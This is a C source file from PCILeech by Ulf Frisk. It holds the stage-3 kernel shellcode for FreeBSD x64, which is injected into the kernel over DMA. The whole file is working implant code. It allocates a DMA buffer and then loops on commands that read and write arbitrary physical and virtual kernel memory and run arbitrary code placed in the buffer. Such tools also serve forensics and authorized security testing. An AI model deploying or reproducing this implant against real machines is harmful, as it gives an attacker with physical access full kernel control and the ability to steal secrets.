// fbsdx64_stage3_c.c : stage3 main shellcode.
// Compatible with FreeBSD x64.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

#define BSD_PHYS2VIRT_BASE 0xFFFFF80000000000ULL

typedef struct tdvm_page_t {
	QWORD _opaque[6];
	QWORD qwPA;
} *vm_page_t;

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdPHYSICAL_MEMORY_RANGE_BSD {
	QWORD StartAddress;
	QWORD EndAddress;
} PHYSICAL_MEMORY_RANGE_BSD, *PPHYSICAL_MEMORY_RANGE_BSD;

typedef struct tdFNBSD { // function pointers to BSD functions and structs
	QWORD dump_avail;
	QWORD kthread_exit;
	QWORD memcpy;
	QWORD memset;
	QWORD pause_sbt;
	QWORD vm_phys_alloc_contig;
	QWORD vm_phys_free_contig;
	QWORD ReservedFutureUse[25];
} FNBSD, *PFNBSD;

#define KMDDATA_OPERATING_SYSTEM_FREEBSD		0x08

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNBSD fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern BOOL LookupFunctionsDefaultFreeBSD(PKMDDATA pk, QWORD qwAddrFNBSD);
extern QWORD SysVCall(QWORD fn, ...);

//-------------------------------------------------------------------------------
// Kernel module functions below.
//-------------------------------------------------------------------------------

/*
* Retrieve system memory ranges from the dump_avail memory structure.
*/
BOOL SetMemoryRanges(PKMDDATA pk)
{
	PPHYSICAL_MEMORY_RANGE pmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrVirtual;
	PPHYSICAL_MEMORY_RANGE_BSD pmrBSD = (PPHYSICAL_MEMORY_RANGE_BSD)pk->fn.dump_avail;
	QWORD i = 0;
	while(pmrBSD[i].StartAddress || pmrBSD[i].EndAddress) {
		pmr[i].BaseAddress = pmrBSD[i].StartAddress;
		pmr[i].NumberOfBytes = pmrBSD[i].EndAddress - pmrBSD[i].StartAddress;
		i++;
	}
	pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

#define SBT_1S		(1ULL << 32)
#define SBT_1MS		(SBT_1S / 1000)

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD idleCount = 0;
	vm_page_t pg_phys;
	// 1: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_FREEBSD;
	if(!LookupFunctionsDefaultFreeBSD(pk, (QWORD)&pk->fn)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: set up mem out DMA area 4MB/16MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	pg_phys = (vm_page_t)SysVCall(pk->fn.vm_phys_alloc_contig, 0x1000000 / 0x1000, 0, 0xf0000000, 0x1000, 0);
	if(!pg_phys) {
		pk->DMASizeBuffer = 0x00400000;
		SysVCall(pk->fn.vm_phys_alloc_contig, 0x00400000 / 0x1000, 0, 0xf0000000, 0x1000, 0);
	}
	if(!pg_phys) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000002;
		return;
	}
	pk->DMAAddrPhysical = pg_phys->qwPA;
	pk->DMAAddrVirtual = BSD_PHYS2VIRT_BASE | pg_phys->qwPA;
	// 3: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			if(idleCount > 10000000000) {
				SysVCall(pk->fn.pause_sbt, "pcileech", SBT_1MS, 0, 0); // 1ms
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.vm_phys_free_contig, pg_phys, pk->DMASizeBuffer / 0x1000);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			SysVCall(pk->fn.kthread_exit);
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = SetMemoryRanges(pk);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrVirtual)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op) { // READ
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, BSD_PHYS2VIRT_BASE | pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE == pk->_op) { // WRITE
			SysVCall(pk->fn.memcpy, BSD_PHYS2VIRT_BASE | pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}
